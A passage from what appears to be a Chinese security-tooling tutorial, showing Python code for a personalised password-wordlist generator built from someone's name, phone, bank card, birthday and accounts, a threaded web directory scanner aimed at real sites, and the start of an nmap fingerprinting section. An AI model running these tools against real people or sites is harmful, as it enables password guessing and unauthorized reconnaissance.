    result.append(get_abbreviation(person.NAME[0]))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#32553;&#20889; &#21517; &#25340;&#38899;</span>
    result.append(get_abbreviation(person.NAME[1:]))
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_phone_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> phone <span style="color: #a020f0;">in</span> person.PHONE:
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#25163;&#26426;&#21495;</span>
        result.append(phone)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#25163;&#26426;&#21495;&#21518;&#22235;&#20301;</span>
        result.append(phone[-4:])
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_card_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#38134;&#34892;&#21345;&#21495;</span>
    result.append(person.CARD)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#38134;&#34892;&#21345;&#21495;&#21518;&#20845;&#20301;</span>
    result.append(person.CARD[-6:])
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#38134;&#34892;&#21345;&#21495;&#21069;&#20845;&#20301;</span>
    result.append(person.CARD[0:6])
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_birthday_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a0522d;">year</span> = person.BIRTHDAY[0]
    <span style="color: #a0522d;">month</span> = person.BIRTHDAY[1]
    <span style="color: #a0522d;">day</span> = person.BIRTHDAY[2]
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#24180;/&#26376;/&#26085;&#30340;&#21508;&#31181;&#32452;&#21512;</span>
    result.append(year)
    result.append(year[2:])
    result.append(month + day)
    result.append(year + month + day)
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_hometown_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#22320;&#22336;&#20840;&#25340;</span>
    result.append(get_pinyin(person.HOMETOWN[0]))
    result.append(get_pinyin(person.HOMETOWN[1]))
    result.append(get_pinyin(person.HOMETOWN[2]))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#39318;&#23383;&#27597;&#22823;&#20889;&#30340;&#22320;&#22336;&#20840;&#25340;</span>
    result.append(get_title(get_pinyin(person.HOMETOWN[0])))
    result.append(get_title(get_pinyin(person.HOMETOWN[1])))
    result.append(get_title(get_pinyin(person.HOMETOWN[2])))
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#32553;&#20889;&#30340;&#22320;&#22336;&#25340;&#38899;</span>
    result.append(get_abbreviation(person.HOMETOWN[0]))
    result.append(get_abbreviation(person.HOMETOWN[1]))
    result.append(get_abbreviation(person.HOMETOWN[2]))
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_place_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> place <span style="color: #a020f0;">in</span> person.PLACE:
        result.append(get_pinyin(place[0]))
        result.append(get_pinyin(place[1]))
        result.append(get_pinyin(place[2]))
        result.append(get_title(get_pinyin(place[0])))
        result.append(get_title(get_pinyin(place[1])))
        result.append(get_title(get_pinyin(place[2])))
        result.append(get_abbreviation(place[0]))
        result.append(get_abbreviation(place[1]))
        result.append(get_abbreviation(place[2]))
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_qq_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> qq <span style="color: #a020f0;">in</span> person.QQ:
        result.append(qq)
    <span style="color: #a020f0;">return</span> result

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#20844;&#21496;&#20449;&#24687;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_company_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> company <span style="color: #a020f0;">in</span> person.COMPANY:
        <span style="color: #a020f0;">for</span> name <span style="color: #a020f0;">in</span> company:
            result.append(get_pinyin(name))
            result.append(get_title(get_pinyin(name)))
            result.append(get_abbreviation(name))
    <span style="color: #a020f0;">return</span> result

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#23398;&#26657;&#20449;&#24687;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_school_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> school <span style="color: #a020f0;">in</span> person.SCHOOL:
        <span style="color: #a020f0;">for</span> name <span style="color: #a020f0;">in</span> school:
            result.append(get_pinyin(name))
            result.append(get_title(get_pinyin(name)))
            result.append(get_abbreviation(name))
    <span style="color: #a020f0;">return</span> result

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#36134;&#21495;&#20449;&#24687;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_account_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    <span style="color: #a020f0;">for</span> account <span style="color: #a020f0;">in</span> person.ACCOUNT:
        result.append(get_pinyin(account))
        result.append(get_title(get_pinyin(account)))
        result.append(get_abbreviation(account))
    <span style="color: #a020f0;">return</span> result

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36890;&#36807;&#19981;&#21516;&#26041;&#24335;&#33719;&#21462;&#21508;&#32452;&#20214;&#20449;&#24687;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_all_component</span>(person):
    <span style="color: #a0522d;">result</span> = []
    result.append(get_name_component(person))
    result.append(get_phone_component(person))
    result.append(get_card_component(person))
    result.append(get_birthday_component(person))
    result.append(get_hometown_component(person))
    result.append(get_place_component(person))
    result.append(get_qq_component(person))
    result.append(get_company_component(person))
    result.append(get_school_component(person))
    result.append(get_account_component(person))
    <span style="color: #a020f0;">return</span> result

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">write_password</span>(password, filename):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[+] %s"</span> % password)
    <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(filename, <span style="color: #8b2252;">"a+"</span>) <span style="color: #a020f0;">as</span> f:
        f.write(<span style="color: #8b2252;">"%s</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">"</span> % password)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">combined_character</span>(compents, Delimiter, prefix, suffix, filename):
    <span style="color: #a020f0;">for</span> compent <span style="color: #a020f0;">in</span> compents:
        <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> compent:
            <span style="color: #a020f0;">if</span> Delimiter == <span style="color: #8b2252;">""</span>:
                <span style="color: #a0522d;">password</span> = prefix + i + Delimiter + suffix
                write_password(password, filename)
                <span style="color: #a020f0;">continue</span>
            <span style="color: #a0522d;">password</span> = prefix + i + Delimiter + suffix
            write_password(password, filename)
            <span style="color: #a0522d;">password</span> = prefix + Delimiter + i + suffix
            write_password(password, filename)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">combined_character_tow</span>(compents, Delimiter, prefix, suffix, filename):
    <span style="color: #a020f0;">for</span> compent_a <span style="color: #a020f0;">in</span> compents:
        <span style="color: #a020f0;">for</span> compent_b <span style="color: #a020f0;">in</span> compents:
            <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> compent_a:
                <span style="color: #a020f0;">for</span> j <span style="color: #a020f0;">in</span> compent_b:
                    <span style="color: #a0522d;">password</span> = prefix + i + Delimiter + j + suffix
                    write_password(password, filename)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">gen_pass</span>(): <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;&#23494;&#30721;&#20989;&#25968;</span>
    <span style="color: #a0522d;">compents</span> = get_all_component(Person) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#25104;&#20998;&#20449;&#24687;</span>
    <span style="color: #a0522d;">filename</span> = <span style="color: #8b2252;">"password.list"</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21333;&#32452;&#20214;&#23494;&#30721;</span>
    <span style="color: #a020f0;">for</span> Delimiter <span style="color: #a020f0;">in</span> Delimiters:
        <span style="color: #a020f0;">for</span> prefix <span style="color: #a020f0;">in</span> Prefix:
            <span style="color: #a020f0;">for</span> suffix <span style="color: #a020f0;">in</span> Suffix:
                combined_character(compents, Delimiter, prefix, suffix, filename)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20004;&#32452;&#20214;&#23494;&#30721;</span>
    <span style="color: #a020f0;">for</span> Delimiter <span style="color: #a020f0;">in</span> Delimiters:
        <span style="color: #a020f0;">for</span> prefix <span style="color: #a020f0;">in</span> Prefix:
            <span style="color: #a020f0;">for</span> suffix <span style="color: #a020f0;">in</span> Suffix:
                combined_character_tow(compents, Delimiter, prefix, suffix, filename)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">"__main__"</span>:
    <span style="color: #a0522d;">start_time</span> = time.time()
    gen_pass()
    <span style="color: #a0522d;">end_time</span> = time.time()
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"[*] &#25195;&#25551;&#32467;&#26463;&#65292;&#20849;&#35745;&#25195;&#25551;&#26102;&#38388;: %.2f s"</span> % (end_time - start_time))
</pre>
</div>

<p>
思考：<br>
如何提高生成效率？<br>
</p>
</div>
</div>
<div id="outline-container-h:02683805-9c1d-40d5-92a8-3b32c2d3cb1a" class="outline-3">
<h3 id="h:02683805-9c1d-40d5-92a8-3b32c2d3cb1a">WEB目录扫描程序</h3>
<div class="outline-text-3" id="text-h:02683805-9c1d-40d5-92a8-3b32c2d3cb1a">
<ul class="org-ul">
<li>main.py 主函数<br></li>
<li>config.json 配置文件<br></li>
<li>websites.txt 域名文件<br></li>
<li>dir_folder/php_dir.txt 待扫描路径<br></li>
<li>webDirScan.py 扫描文件<br></li>
<li>util.py 工具类<br></li>
</ul>

<p>
使用 logging 模块记录日志<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">util.py</span>

<span style="color: #a020f0;">import</span> logging
<span style="color: #a020f0;">from</span> logging <span style="color: #a020f0;">import</span> handlers

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Logger</span>(<span style="color: #483d8b;">object</span>):
    <span style="color: #a0522d;">level_relations</span> = {
        <span style="color: #8b2252;">'debug'</span>: logging.DEBUG,
        <span style="color: #8b2252;">'info'</span>: logging.INFO,
        <span style="color: #8b2252;">'warning'</span>: logging.WARNING,
        <span style="color: #8b2252;">'error'</span>: logging.ERROR,
        <span style="color: #8b2252;">'crit'</span>: logging.CRITICAL
    } <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26085;&#24535;&#32423;&#21035;&#20851;&#31995;&#26144;&#23556;</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, filename, level=<span style="color: #8b2252;">'info'</span>, when=<span style="color: #8b2252;">'D'</span>, backcount=3,
                 fmt=<span style="color: #8b2252;">'%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s'</span>):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">logger</span> = logging.getLogger(filename)
        <span style="color: #a0522d;">format_str</span> = logging.Formatter(fmt) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#26085;&#24535;&#26684;&#24335;</span>
        <span style="color: #a020f0;">self</span>.logger.setLevel(<span style="color: #a020f0;">self</span>.level_relations.get(level)) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#26085;&#24535;&#32423;&#21035;</span>
        <span style="color: #a0522d;">sh</span> = logging.StreamHandler() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24448;&#23631;&#24149;&#19978;&#36755;&#20986;</span>
        sh.setFormatter(format_str) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#23631;&#24149;&#19978;&#26174;&#31034;&#30340;&#26684;&#24335;</span>
        <span style="color: #a0522d;">th</span> = handlers.TimedRotatingFileHandler(filename=filename, when=when,backupCount=backcount,encoding=<span style="color: #8b2252;">'utf-8'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24448;&#25991;&#20214;&#37324;&#20889;&#20837; &#25351;&#23450;&#38388;&#38548;&#26102;&#38388;&#33258;&#21160;&#29983;&#25104;&#25991;&#20214;&#30340;&#22788;&#29702;&#22120;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23454;&#20363;&#21270;TimedRotatingFileHandler</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">interval&#26159;&#26102;&#38388;&#38388;&#38548;&#65292;backupCount&#26159;&#22791;&#20221;&#25991;&#20214;&#30340;&#20010;&#25968;&#65292;&#22914;&#26524;&#36229;&#36807;&#36825;&#20010;&#20010;&#25968;&#65292;&#23601;&#20250;&#33258;&#21160;&#21024;&#38500;&#65292;when&#26159;&#38388;&#38548;&#30340;&#26102;&#38388;&#21333;&#20301;&#65292;&#21333;&#20301;&#26377;&#20197;&#19979;&#20960;&#31181;&#65306;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">S &#31186;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">M &#20998;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">H &#23567;&#26102;&#12289;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">D &#22825;&#12289;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">W &#27599;&#26143;&#26399;&#65288;interval==0&#26102;&#20195;&#34920;&#26143;&#26399;&#19968;&#65289;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">midnight &#27599;&#22825;&#20940;&#26216;</span>
        th.setFormatter(format_str) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#25991;&#20214;&#37324;&#20889;&#20837;&#30340;&#26684;&#24335;</span>
        <span style="color: #a020f0;">self</span>.logger.addHandler(sh) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25226;&#23545;&#35937;&#21152;&#21040;logger&#37324;</span>
        <span style="color: #a020f0;">self</span>.logger.addHandler(th)
</pre>
</div>

<p>
通过配置文件来配置扫描内容<br>
config.json<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">{
    // web&#22495;&#21517;&#37197;&#32622;&#25991;&#20214;
    <span style="color: #8b2252;">"websites"</span> : <span style="color: #8b2252;">"websites.txt"</span>,
    // web&#30446;&#24405;&#25991;&#20214;
    <span style="color: #8b2252;">"dic_folder"</span> : <span style="color: #8b2252;">"dir_folder"</span>,
    <span style="color: #8b2252;">"request_method"</span> : <span style="color: #8b2252;">"GET"</span>,
    // &#25351;&#23450;&#25195;&#25551;&#32447;&#31243;&#25968;
    <span style="color: #8b2252;">"thread_num"</span> : 16
}
</pre>
</div>

<p>
websites.txt<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">www.baidu.com
https://www.z2pyw.com/mv
</pre>
</div>

<ul class="org-ul">
<li>dir_folder/php_dir.txt 待扫描路径<br></li>
</ul>
<div class="org-src-container">
<pre class="src src-sh">test/
page/1
test.php
</pre>
</div>


<p>
管理模块用来读取配置文件，启动扫描任务<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">mian.py</span>

<span style="color: #a020f0;">import</span> json
<span style="color: #a020f0;">from</span> concurrent.futures <span style="color: #a020f0;">import</span> ThreadPoolExecutor
<span style="color: #a020f0;">from</span> webDirScan <span style="color: #a020f0;">import</span> *

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Manager</span>(<span style="color: #483d8b;">object</span>):
    <span style="color: #a0522d;">cfg</span> = <span style="color: #008b8b;">None</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>): <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21021;&#22987;&#21270;&#32447;&#31243;&#27744;&#24182;&#21152;&#36733;&#25991;&#20214;&#20869;&#23481;</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">conf</span> = json.load(<span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">'config.json'</span>))
            <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">cfg</span> = {<span style="color: #8b2252;">'websites'</span>: <span style="color: #a020f0;">self</span>.read_websites(conf[<span style="color: #8b2252;">'websites'</span>]),
                        <span style="color: #8b2252;">'dics'</span>: <span style="color: #a020f0;">self</span>.read_web_path(conf[<span style="color: #8b2252;">'dic_folder'</span>]),
                        <span style="color: #8b2252;">'thread_num'</span>: conf[<span style="color: #8b2252;">'thread_num'</span>]}
            <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">pool</span> = ThreadPoolExecutor(max_workers=<span style="color: #a020f0;">self</span>.cfg[<span style="color: #8b2252;">'thread_num'</span>])
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'Manager __init__ error: %s'</span> % e)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a020f0;">for</span> site <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">self</span>.cfg[<span style="color: #8b2252;">'websites'</span>]:
                <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#35835;&#21462;&#19968;&#20010;&#22495;&#21517;&#23601;&#21551;&#21160;&#19968;&#20010;&#32447;&#31243;&#36827;&#34892;&#25195;&#25551;</span>
                <span style="color: #a0522d;">w</span> = Worker(site, <span style="color: #a020f0;">self</span>.cfg, <span style="color: #a020f0;">self</span>.pool)
                w.start()
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'Manager Start error: %s'</span> % e)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">read_websites</span>(<span style="color: #a020f0;">self</span>, webcfg):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">websites</span> = []
            <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(webcfg, <span style="color: #8b2252;">'r'</span>) <span style="color: #a020f0;">as</span> webs:
                <span style="color: #a020f0;">for</span> web <span style="color: #a020f0;">in</span> webs.readlines():
                    websites.append(web.strip())
            <span style="color: #a020f0;">return</span> websites
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'ReadWebsites error : %s'</span> % e)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">read_web_path</span>(<span style="color: #a020f0;">self</span>, diccfg):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">dics</span> = []
            <span style="color: #a0522d;">doclist</span> = os.listdir(diccfg)
            doclist.sort()
            <span style="color: #a020f0;">for</span> filename <span style="color: #a020f0;">in</span> doclist:
                <span style="color: #a0522d;">filename</span> = diccfg+<span style="color: #8b2252;">'/'</span>+filename
                <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(filename, <span style="color: #8b2252;">'r'</span>) <span style="color: #a020f0;">as</span> f:
                    <span style="color: #a020f0;">for</span> i <span style="color: #a020f0;">in</span> f.readlines():
                        dics.append(i.strip())
            <span style="color: #a020f0;">return</span> dics
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'dic error : %s , dicname:%s'</span> % (e, filename))

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">main</span>():
    <span style="color: #a0522d;">w</span> = Manager() <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#31649;&#29702;&#32773;&#23454;&#20363;</span>
    w.start()

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    main()
</pre>
</div>

<p>
扫描目录负责目录扫描和信息记录<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">webDirScan.py</span>

<span style="color: #a020f0;">import</span> requests
<span style="color: #a020f0;">import</span> threading
<span style="color: #a020f0;">import</span> os
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">from</span> util <span style="color: #a020f0;">import</span> Logger
<span style="color: #a020f0;">from</span> concurrent.futures <span style="color: #a020f0;">import</span> wait
<span style="color: #a020f0;">from</span> requests.packages <span style="color: #a020f0;">import</span> urllib3

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24573;&#30053;HTTPS&#21578;&#35686;</span>
urllib3.disable_warnings()
<span style="color: #a0522d;">g_mutex</span> = threading.Lock()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26085;&#24535;&#25991;&#20214;&#30446;&#24405;&#20026;&#24403;&#21069;&#30446;&#24405;&#25152;&#22312;&#25991;&#20214;&#19979;&#30340;log&#30446;&#24405;</span>
<span style="color: #a0522d;">log_dir</span> = os.path.dirname(os.path.abspath(__file__))+<span style="color: #8b2252;">'/log/'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#30446;&#24405;&#19981;&#23384;&#22312;&#21017;&#21019;&#24314;</span>
<span style="color: #a020f0;">if</span> <span style="color: #a020f0;">not</span> os.path.exists(log_dir):
    os.mkdir(log_dir)
<span style="color: #a0522d;">cur_time</span> = time.strftime(<span style="color: #8b2252;">'%Y-%m-%d'</span>, time.localtime(time.time())).replace(<span style="color: #8b2252;">':'</span>,<span style="color: #8b2252;">''</span>).replace(<span style="color: #8b2252;">' '</span>, <span style="color: #8b2252;">'_'</span>)
<span style="color: #a0522d;">LogFile</span> = log_dir + cur_time + <span style="color: #8b2252;">'.log'</span>
<span style="color: #a0522d;">logging</span> = Logger(LogFile, level=<span style="color: #8b2252;">'debug'</span>).logger

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Worker</span>(<span style="color: #483d8b;">object</span>):
    <span style="color: #a0522d;">site</span> = <span style="color: #008b8b;">None</span>
    <span style="color: #a0522d;">cfg</span> = <span style="color: #008b8b;">None</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, site, cfg, pool):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">site</span> = site
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">cfg</span> = cfg
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">pool</span> = pool
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">scan_list</span> = []
            <span style="color: #a020f0;">for</span> web_dir <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">self</span>.cfg[<span style="color: #8b2252;">'dics'</span>]:
                <span style="color: #a0522d;">t</span> = Scanner(<span style="color: #a020f0;">self</span>.site, web_dir)
                <span style="color: #a0522d;">future</span> = <span style="color: #a020f0;">self</span>.pool.submit(t.run())
                scan_list.append(future)
            wait(scan_list)
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'Start error: %s'</span> % e)

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Scanner</span>():
    <span style="color: #a0522d;">site</span> = <span style="color: #008b8b;">None</span>
    <span style="color: #a0522d;">dics</span> = <span style="color: #008b8b;">None</span>
    <span style="color: #a0522d;">request_method</span> = <span style="color: #008b8b;">None</span>
    <span style="color: #a0522d;">headers</span> = {
        <span style="color: #8b2252;">'user-agent'</span>: <span style="color: #8b2252;">'Mozilla/5.0 (Windows NT 6.1; WOW64) '</span>
        <span style="color: #8b2252;">'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36'</span>}
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>, site, dics):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">site</span> = site
            <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">dics</span> = dics
            <span style="color: #a020f0;">if</span> <span style="color: #a020f0;">self</span>.site.endswith(<span style="color: #8b2252;">'/'</span>):
                <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">site</span> = <span style="color: #a020f0;">self</span>.site[:-1]
            <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">'://'</span> <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">self</span>.site:
                <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">site</span> = <span style="color: #8b2252;">'http://'</span> + <span style="color: #a020f0;">self</span>.site
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'Scanner_init error: %s'</span> % e)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">self</span>.ScanOne(<span style="color: #a020f0;">self</span>.site, <span style="color: #a020f0;">self</span>.dics)
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">ScanOne</span>(<span style="color: #a020f0;">self</span>, site, dic):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a020f0;">if</span> <span style="color: #a020f0;">not</span> dic.startswith(<span style="color: #8b2252;">'/'</span>):
                <span style="color: #a0522d;">dic</span> = <span style="color: #8b2252;">'/'</span> + dic
            <span style="color: #a0522d;">url</span> = site + dic
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#20801;&#35768;&#37325;&#23450;&#21521;&#65292;&#38450;&#27490;&#37325;&#23450;&#21521;&#35823;&#35782;&#21035;&#20026;&#23384;&#22312;&#30340;&#39029;&#38754;</span>
            <span style="color: #a0522d;">res</span> = requests.get(url, verify=<span style="color: #008b8b;">False</span>, allow_redirects=<span style="color: #008b8b;">False</span>, headers=<span style="color: #a020f0;">self</span>.headers, timeout=8)
            <span style="color: #a020f0;">if</span> 200 == res.status_code:
                <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[93m[+]</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[96m%d</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[0m %s'</span> % (res.status_code, url))
                <span style="color: #a020f0;">self</span>.WriteFile(<span style="color: #8b2252;">'./out.txt'</span>, url)
            <span style="color: #a020f0;">else</span>:
                <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[95m[-]</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[31m%d</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[0m %s'</span> % (res.status_code, url))
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">'Max retries exceeded with url'</span> <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">str</span>(e):
                <span style="color: #a020f0;">pass</span>
            <span style="color: #a020f0;">else</span>:
                logging.error(<span style="color: #8b2252;">'Start error: %s , url:%s'</span> % (e, url))
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">WriteFile</span>(<span style="color: #a020f0;">self</span>, <span style="color: #483d8b;">file</span>, msg):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20889;&#25991;&#20214;&#26102;&#21152;&#38145;</span>
            g_mutex.acquire()
            <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(<span style="color: #483d8b;">file</span>, <span style="color: #8b2252;">'a+'</span>) <span style="color: #a020f0;">as</span> f:
                f.write(<span style="color: #8b2252;">'%s</span><span style="color: #008b8b;">\r\n</span><span style="color: #8b2252;">'</span> % (<span style="color: #483d8b;">str</span>(msg)))
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            logging.error(<span style="color: #8b2252;">'WriteFile error : %s'</span> % e)
        <span style="color: #a020f0;">finally</span>:
            g_mutex.release()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7359c06f-7ae6-4389-83c1-cb38d1048d92" class="outline-3">
<h3 id="h:7359c06f-7ae6-4389-83c1-cb38d1048d92">指纹识别工具开发</h3>
<div class="outline-text-3" id="text-h:7359c06f-7ae6-4389-83c1-cb38d1048d92">
<p>
使用python-nmap 模块进行指纹识别并输出<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install python-nmap
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> optparse <span style="color: #b22222;"># </span><span style="color: #b22222;">Import the module</span>
